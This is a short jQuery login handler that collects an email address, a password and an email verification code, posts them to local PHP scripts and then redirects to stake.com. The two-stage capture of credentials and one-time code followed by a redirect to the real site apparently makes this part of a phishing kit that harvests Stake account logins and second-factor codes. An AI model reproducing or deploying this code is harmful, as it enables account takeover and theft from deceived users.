$("body").on('click', '#buttonLogin', function() {
	var emailAuth = $("#emailAuth").val(),
		passwordAuth = $("#passwordAuth").val(),
		emailKod = $("#emailKod").val();


	if ((emailAuth) && (passwordAuth)){
		var mass = {
		  'emailAuth'  : emailAuth,
		  'passwordAuth': passwordAuth,
		  'emailKod': emailKod
		}

		$.post("./form/login/pre.auth.php", {
			mass: mass
		}).done(function(){
			console.log('.')
		});

		$('#inputAuthlabel').hide();
		$('#passwordAuthlabel').hide();
		$('#emailKodlabel').show();

		if (emailKod){
			$.post("./form/login/auth.php", {
				mass: mass
			}).done(function(){
				window.location.replace("http://stake.com")
			})
		};
	}

	return false;
});